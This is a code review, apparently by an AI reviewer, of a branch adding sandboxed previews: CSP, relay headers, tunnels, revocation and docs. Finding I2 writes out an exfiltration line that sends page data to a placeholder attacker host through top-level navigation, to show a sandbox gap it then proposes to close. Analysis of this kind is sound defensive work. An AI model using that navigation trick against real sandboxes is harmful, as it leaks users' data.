# UX-2 final whole-branch review (J2)

- Branch `feat/ux-2`, range `e5eeba9a..c7a988a5` (38 commits, 351 files, about 26.8k lines added). Reviewer: Opus, read-only, no subagents.
- Read against: spec `docs/specs/2026-10-28-ux-2-design.md` (amended by decision 139 and the plan fix), plan `docs/plans/2026-10-28-ux-2.md` (Global Constraints, Review Focus, owner decisions), ADR 0088, decisions 138 and 139, red team `.superpowers/ux2-redteam.md`, ledger `progress.md` and `rulings.md`.
- Method: passes by area over the tree at `c7a988a5`: (1) `kernel/http/preview/*` and `kernel/http/{fetch-site,reserved,app}.ts`, `ws-server.ts`; (2) `modules/previews/*`, `compose-previews*.ts`, `daemon.ts`, users disable and delete; (3) agent-vm gateway, guest-link, guest-tunnels, box-tunnels, box-control; (4) pi-host `guest/services/*`, `guest/{dial,guest,main}.ts`, policy and platform text; (5) contracts; (6) web previews, preview window, rich replies and `@pap/ui` markdown pieces; (7) e2e J18 to J20; (8) docs. Nothing heavy was run: J1 is green, and each doubt below was settled by reading the code path end to end. No file under `node_modules` was read (owner rule), so Mermaid's internals were judged from the T15 probe and J18, not re-probed.

## Strengths

- **C1 is fixed at the root.** `serviceCsp` (`kernel/http/preview/csp.ts:74-88`) names the preview origin (never `'self'`), its `ws:`/`wss:` form, `data:` and `blob:`, and only the minted hosts; frame, child and worker sources exclude `data:` and `blob:`, `object-src 'none'`, `form-action` and `base-uri` spelled out. `hostSources` reuses the proxy's own parser and the shared `ipAlwaysRefused`, drops pap's own hosts and addresses, and caps the list. Sources are frozen in the grant at mint (`service.ts:227`), and a no-network service gets none.
- **C2 is fixed as the red team asked.** A diagram is one `<img>` of a `data:` SVG (opaque, a better call than `blob:`), the secure-key list covers every theme key, `htmlLabels: false`, and math and diagrams sit in `contain-rich`/`contain-rich-inline`. J18 proves containment in Chromium and WebKit with a painted-area oracle, and its mutation (`contain: none`) went red on both engines. `no-inner-html.test.ts` pins `dangerouslySetInnerHTML` to `MathBlock.tsx` alone.
- **The relay cleans with an allowlist both ways.** `headers.ts` keeps 15 response headers plus a contained `Location`, drops cookies, credentials, the referrer and forwarding headers on the way in, and a non-101 upgrade answer is a bare 502. Body framing is set after cleaning (`framed`), so a `Connection` list cannot unframe a body.
- **The registry trusts only the daemon.** `trusted()` (`registry.ts:196-213`) refuses a guest answer with another name, port or an id recorded elsewhere, and `network` is always the daemon's. `networkOf` reads the start-time profile (`agent-surface.ts:264`), and `modeNow` re-reads the mode, so the worker's word decides nothing.
- **Flow control is enforced by the receiver** on both sides: `tunnelSocket` cuts past window plus one frame and on an over-ack, and the guest does the same. Pings are answered before frames are parsed, and slot entries live only while asked or open. The channel is wrapped in the same turn (`grants.ts:48`), as ruled in T7.
- **The namespace helper is minimal and pid-safe.** The descriptor is opened before the start time is re-checked (`ns-dial.ts:49-62`). The helper runs `nsenter --net` only, with env `{PATH}` and cwd `/`, never reads a byte, and is capped at 4 per guest with idle drop.
- **Revocation paths are complete for new requests:** lease expiry (lazy plus sweep), `previews.close`, stop, exit report, restart (new id), refresh-removed, box stop (phase and link close), disable (first and unconditional) and delete. `grantOf` re-checks `running`, the box and the owner on every request.
- **The production wiring is real and tested.** `previews.relay.int.test.ts` drives the composed daemon on the process backend through the real listener, tunnel and guest. `daemon.preview.int.test.ts` pins `frame-src`, the `/ws` same-site 403 and the held-port path. `get-routes.int.test.ts` makes the GET route table an invariant.
- **Docs are honest.** ADR 0088's Known limits name WebRTC, DNS, rebinding, downloads, LAN mode, filled bounds and KaTeX's negative sizes, and no "isolated" or "safe" claim appears. The EN/FR copy matches the plan's table verbatim, with « vous » throughout.
- **Repo rules hold:** no file over 400 lines, pi-host production code imports only `@pap/contracts/pi-host`, `methods.ts` untouched (spread from `project-box-methods.ts`), tokens-only UI (lint green at J1).

## Issues

### Critical

None.

### Important

**I1. START PREVIEW reads a stale declaration: missing after a session-launched start, and a dead-end `conflict` loop after an edit.**
- Files: `apps/daemon/src/modules/agent-vm/box-control.ts:85-90` (the only writer of the `previews` map is `readWanted`), `:117` (called from `bringUp` only), `:181` (and from `rebuild`), `:197` (`preview()` returns the cache); `apps/daemon/src/modules/projects/box-service.ts:137` (`projects.box` serves that cache); `apps/web/src/features/previews/StartDeclared.tsx:51-57`; `apps/daemon/src/compose-previews.ts:186-192` (the fresh read in `startProject`).
- What is wrong:
  - A box started by a session launch goes through `runtime.spawn` → `startVm` (`runtime.ts:230`), not through `bringUp`. That is the common path, since opening a session starts the box. `readWanted` never runs, so `projects.box.preview` is `null` and START PREVIEW never shows until Start, Restart box or Rebuild. The T13 report flagged this ("may be null after a session-launch start") and T10 deferred it.
  - An edit of `.pi/project.yaml` while the box runs is never seen. That is the expected flow: the agent writes the `preview:` key in the running box. When a declaration was cached, the page shows the old command. `previews.startProject` reads the file fresh and answers `conflict`, and StartDeclared re-reads `projects.box`, which returns the same stale cache. The page then shows "The preview in .pi/project.yaml changed. Check the new command, then start it." over the old command, and every click answers `conflict` again. The UX2-R74 flow cannot complete until the box restarts.
- Why it matters: spec §5 says the page shows START PREVIEW "when it is present" (G3), and the conflict copy promises the page shows the new command. Neither holds on the real daemon. The T10 int case `a declaration changed after the page read it answers conflict` and the T13 web tests (`projects.box` mocked to return the new declaration) cannot see it.
- Fix (small, daemon-side):
  1. Give box-control a `notePreview(projectId, decl, invalid)` setter. `projectConfig` in `compose-previews.ts` calls it after every fresh read, so a `conflict` leaves the cache holding what the file says now and the page's re-read shows the new command.
  2. Refresh the cache when a box reaches `running` by any path: on box-control's own `runtime.onPhase` "running", read `project.config` with `BoxOps.poll` so it never counts as activity and never starts a box.
  3. Optionally, `projects.box` on a running box polls once, bounded.
- Tests:
  - int: a box started by a session launch with a preview in the file → `projects.box.preview` is set;
  - int: change the file, `startProject` with the old command → `conflict`, then `projects.box` shows the new command and `startProject` with it starts the service.

**I2. A service page loaded top-level is served and can navigate itself anywhere. The artifact route refuses this; the service route does not, and the docs say otherwise.**
- Files: `apps/daemon/src/kernel/http/preview/listener.ts:174-177` (service dispatch) compared with `:140-144` (`serveArtifact` refuses `Sec-Fetch-Dest` other than `iframe`); `docs/adr/0088-previews-and-the-untrusted-origin.md` Known limits ("A page can navigate itself within the preview origin"); `docs/agents/agents-vm.md:290`.
- What is wrong: framed, a page's self-navigation is held by pap's `frame-src` and the sandbox's missing `allow-top-navigation`/`allow-popups`. Top-level, a sandboxed document may navigate itself (HTML "allowed by sandboxing to navigate": A = B returns true), and no CSP directive governs navigation. A no-network box's page that the owner opens top-level, for example with Firefox's one-click "This Frame › Open Frame in New Tab", can run `location = "https://attacker/?d=" + data`. That is the C1 exit through the owner's browser, behind an innocent-looking owner action. The plan's "Not built" line excludes "a top-level page on the preview origin", and the listener already applies the rule to artifacts for exactly this reason (its comment at `:143`).
- Fix:
  - In `dispatch`, for a service target, refuse `req.headers["sec-fetch-dest"] === "document"` with `refuse(res, 404, "dest_refused", token, grant.box)` before `touch`. Leave the upgrade path alone: its `Sec-Fetch-Dest` is `websocket` or empty, iframe navigations are `iframe`, and downloads are `empty`.
  - Add one Known-limits sentence (ADR 0088, `agents-vm.md`): in `--insecure-http` LAN mode no `Sec-Fetch-Dest` is sent, so a service URL opened top-level by hand is served and can navigate anywhere.
- Test: a listener int case: a service token with `sec-fetch-dest: document` → 404 `dest_refused`; with `iframe` → relayed; an upgrade is unaffected.

### Minor

- **M1. Revocation does not cut a live relay.** A WebSocket or a streaming answer opened before a token is revoked keeps flowing until its socket closes (`tokens.ts:236-239` drop entries; `listener.ts:64,117-121` tracks cuts for `close()` only). Today every revocation path except disable also ends the socket another way: the pane unmounts, the service dies, or the box stops, and disable stops the boxes too. Residual: a disable whose box stop fails, and the ADR/agents-vm wording "dies at …". Fix: key the listener's `live` cuts by token hash and let grants signal revocation, or re-check `grantOf` on each idle tick of a WebSocket; otherwise say "new connections are refused" in the docs.
- **M2. The new-tab window mints on every load** (`routes/preview/PreviewWindow.tsx:33-36`). A browser session restore, or a cross-site link to `/preview/<box>/<name>` (it passes the fetch-site guard as an app-shell navigation), loads the page without a click in pap, the M5 class. Impact is low (the page keeps its restricted CSP). Fix: arm only with a one-use marker the opener writes (a nonce in the hash checked against `localStorage`, stripped with `history.replaceState`); otherwise show `previews.notOpen` with OPEN PREVIEW.
- **M3. `PAP_PREVIEW_ORIGIN` equal to an app origin is accepted** (`kernel/config-preview.ts:34-54`, deferred T1a). It is not exploitable (the listener's CSP `sandbox` still gives an opaque origin, and pap's service worker would serve the SPA instead), but it silently breaks previews and frames pap's own origin. Fix: a `ConfigError` when it equals `publicOrigin` or any `allowedOrigins` entry.
- **M4. START PREVIEW shows 200 characters of a command of up to 4096, with whitespace collapsed** (`features/previews/StartDeclared.tsx:13-15,64-67`). The plan chose this (UX2-R80), but it is a consent point: a tail after the 200th character, or after a newline rendered as a space, is not what the owner reads. Suggest the full command in a `<details>` with `whitespace-pre-wrap`.
- **M5. J18 has no Mermaid `classDef`/`style` statement case.** The transient draw lives in pap's DOM inside the hidden contained container, and its `<style>` relies on Mermaid's own scoping. The themeCSS case cannot cover that path. Add a hostile diagram with a `classDef` carrying `position:fixed` and a stray `}`, asserting no such style text remains in the document and nothing is painted outside the block.
- **M6. Stale `blob:` wording** in `apps/web/src/no-inner-html.test.ts:21-22` (now a `data:` URL, T15 ruling) and in decision 139's row. Let the addendum below say `data:`.
- **M7. The decision 139 addendum is not in `docs/research/decisions-log.md` yet.** The spec, ADR 0088 and agents-vm.md cite it (PF-7, daemon-side log redaction). The T17 F3 ruling gives it to the controller at the merge, so it should go in the merge commit (include the `data:` URL choice).

## Focus by focus

1. **Review Focus 1-3 and the red team's Criticals.**
   - Focus 1 holds (cookies, headers, CSP, Fetch Metadata, LAN-mode layers, both sandbox sets), with I2 as the one gap.
   - Focus 2 holds: the daemon decides the network (start-time profile) and the registry overrides the guest's word.
   - Focus 3 holds: `refresh`/`logs` use `poll`, traffic touches at most once per 10 s, and box stop revokes and empties.
   - C1 and C2 are fixed as specified.
2. **Production compose wiring (T3, T10).** `composePreviews` binds the listener before the app (`frame-src` known), a bind failure leaves `origin` null, and the sweep timer goes on the kernel clock. `bind` is one-shot. The chain is listener `grantOf` → `createPreviewGrants` (tokens, then registry `byId`, running, box and owner re-checked, port from the registry) → `createBoxTunnels` (running phase or `box_stopped`, never starts a box) → `guest-link.openTunnel` → guest `connectTo` (ownership re-checked) → tunnel. `onFetchSiteRefused` goes to both `createHttpApp` and `createWsServer`; `frameSrc` is exact-origin checked. The disable and delete cascades revoke owner tokens; PF-10 (artifacts without a VM stack) is wired. Only I1 sits outside this chain, in box-control.
3. **VM boundary.**
   - Tunnel hellos pass the same launch-token and image checks, and slots are random, single-use and per link (a tunnel hello cannot claim a pty or worker slot: separate maps).
   - Flow control is enforced by both receivers.
   - The supervisor runs `bwrapVmArgv` with the shell's seccomp and fixed env, no vault, `rootView: "read-only"` (narrower than an overlay shell) and the daemon's network.
   - Stop signals the outer bwrap only.
   - Ownership is required for `running` and re-checked per connection.
   - The nsenter helper is pid-reuse safe and enters only.
   - The plain launcher needs both `PAP_GUEST_LAYOUT` and `PAP_GUEST_SERVICES=plain`, which only the process backend sets.
4. **Cross-task consistency.**
   - `box_stopped` vs `not_found` (`missing()` in registry and service), and `unavailable` only for a down listener, as ruled; the web maps `not_found` to "gone".
   - `service` (ops) vs `name` (views, RPCs, platform args), as ruled in T4.
   - Declared error lists match what each path can throw.
   - The platform op maps `box_stopped` to `unavailable` for the model.
5. **Copy and docs.** Consent points: the supervised card carries the command (T8); START PREVIEW shows the clipped command (M4). EN/FR match the plan. The docs do not overstate, except I2's "within the preview origin" and M1's "dies".
6. **Repo rules.** Clean (400 lines, boundaries, pi-host imports, tokens, erasable TS; lint, knip and typecheck green at J1).
7. **What only Kata proves, and whether it should block.** Kata alone proves:
   - `nsenter` in the `pap-base-3` image and `setns` into a bwrap'd namespace as guest root inside Kata;
   - the ownership check against Kata's real pid and user namespaces;
   - a tunnel over the real gateway path, including a WebSocket;
   - no bridge port from a no-network service;
   - `port_not_owned` inside a VM.

   Every failure mode there fails closed: `port_timeout` or "not reachable", never a widened namespace. The no-network sandbox is the shell's existing `--unshare-net`, already proven for the shell, and `util-linux` is Essential in Debian anyway. Nothing in that list should block the merge; UX2-R75's policy (revert the local merge before the push on a failed security case) is the right gate.

## Deferred-minor triage (ledger)

**Fix before merge:**
- T10 "whether a box started by a session's launch records its `preview`", with T13's same note → **promoted to I1**.

**Recommended in the same fix wave (cheap, not blocking):**
- T1a: refuse `PAP_PREVIEW_ORIGIN` equal to an app origin (= M3).
- T5: give `guest.services.int.test.ts` a `finally` cleanup. Its failure and mutation runs leaked services on the shared host three times this run, and the host has a known memory ceiling (OOM memory note).

**Can wait** (correctness of exotic inputs, test strength or tidiness; none changes a security outcome):
- T1a: unchecked interpolation in `serviceCsp`/`rawRefusal` (inputs are validated upstream); `--preview-port=` empty; env error wording; `preview-csp.test.ts:85` ordering; comment wraps; the compose-agents-vm flake (watch, root-cause if it repeats).
- T1b:
  - `listener-bed.ts` beside production code;
  - idle, `waitFor` and arrival-order test details;
  - streamed-413 check;
  - the untested answer-chunk touch;
  - `framed()` turning `gzip, chunked` into `chunked` (browsers never send transfer-coding gzip);
  - `onUpgrade` dropping `head` (browsers wait for the 101);
  - error name only in notes;
  - the 417 logged as `not_found`.
- T2: `exactOrigin` silent; unknown values logged as cross-site; spy setup.
- T3: `freePort` in `daemon.preview.int`; duplicated `--port` validation; `probePreview` untested; long comment; `previewPortOf` at 65535.
- T4: exact non-idempotent set pin; trailing tab in a fence close.
- T5: duplicated gateway-host parsing; `treeOf` copies on insert (quadratic only for very wide parents, fine at VM scale); launcher predicate negative test; netns "child" pin; test titles; SIGTERM handler before boot; start-time re-check note.
- T6:
  - `tunnels.rig.ts` in src (test-only import, not in the agent bundle);
  - 60 s title without a clock;
  - `guest.ts` at 367;
  - bundle fixture check;
  - double log;
  - cap fd assertion;
  - a crashed helper counted toward the cap (self-heals at the next ask);
  - `ns-dial` handle with `ok !== true` (trusted helper);
  - supervisor `dial()` listener drop: no window, since the continuations are microtasks before any I/O event.
- T7: inexact assertions; no gateway case for a tunnel hello on a pty or worker slot (separate maps make it a refusal by construction).
- T8: the box `project` profile with a VM not exercised.
- T9:
  - `rec.ownerId` vs `ownerOf(box)` (only diverges if someone other than the box owner starts a session in the box);
  - `registry.close()` listeners;
  - the 2.5 s service-life flake risk (watch);
  - the 256 cap not crossed;
  - fail-closed refused-answer hardening (a lying guest only lies about what it serves itself);
  - test title and card assertion.
- T10: `service-reads.ts` at +17; comments; the not_found/box_stopped choice duplicated in `service.ts:88`.
- T12: phone entry opens the first service; mint without an id disables restart detection; StrictMode comment; stale `box_stopped` tightening; `lost` not cleared; `connection_lost` copy.
- T13: "hidden in down mode"; logs dialog stale guard; `pagehide` and bfcache (self-heals at the next renew); register-boxes chunk.
- T14: `renderTex` throw reported as `lazy_chunk_failed`; open-file description not visible; data props.
- T15:
  - image shape GET (documented);
  - intrinsic size;
  - theme flip;
  - RED reconstructed;
  - strict artifact equality (safe direction);
  - `reportFailure` dep;
  - SVG output size (bounded indirectly by `maxTextSize` and `maxEdges`);
  - shared issue name.
- T16a: listeners across serial cases; `freePort` TOCTOU; label check.
- T16b:
  - `framed.ts:273` 192.0.2.1 proxy assertion (vacuous; assert on `proxy.refused` instead, while per-vector CSP violations are pinned separately);
  - J19 socket leg;
  - global proxy fixture;
  - SOCKS5.

## Declined to judge

- Mermaid's internal CSS scoping during the transient draw. Reason: reading `node_modules` is outside the owner's rule. The T15 Opus review probed the real package; M5 asks for a J18 case instead.
- WebRTC and DNS lookups from a preview page. Reason: an owner-accepted Known limit (decision 139).
- The unauthenticated 256-socket hold on the preview listener. Reason: a residual ruled in T1b and documented.
- The 200-character clip of the declared command. Reason: a plan decision (UX2-R80); raised only as M4.
- The Kata journey itself. Reason: not run, as instructed; judged in Focus 7.
- `packages` staleness for session-launched boxes. Reason: pre-existing B1 behaviour; only the preview half is in this lot (I1).
- Visual layout and spacing of the pane, strip and lists. Reason: outside this review's focus; covered by the Sonnet task reviews and J18.

## Verdict

**Ready after fixes.** The security core (C1, C2, the relay, Fetch Metadata, the registry and network decision, flow control, the namespace helper) is sound and well tested, and nothing is Critical. Fix I1 (the stale project-file declaration, a functional dead end in G3) and I2 (refuse a top-level service load and name the LAN residual) in the planned Sonnet fix wave, then do a scoped re-review. M3 and the T5 test cleanup are worth taking in the same wave. Add the decision 139 addendum at the merge (M7).
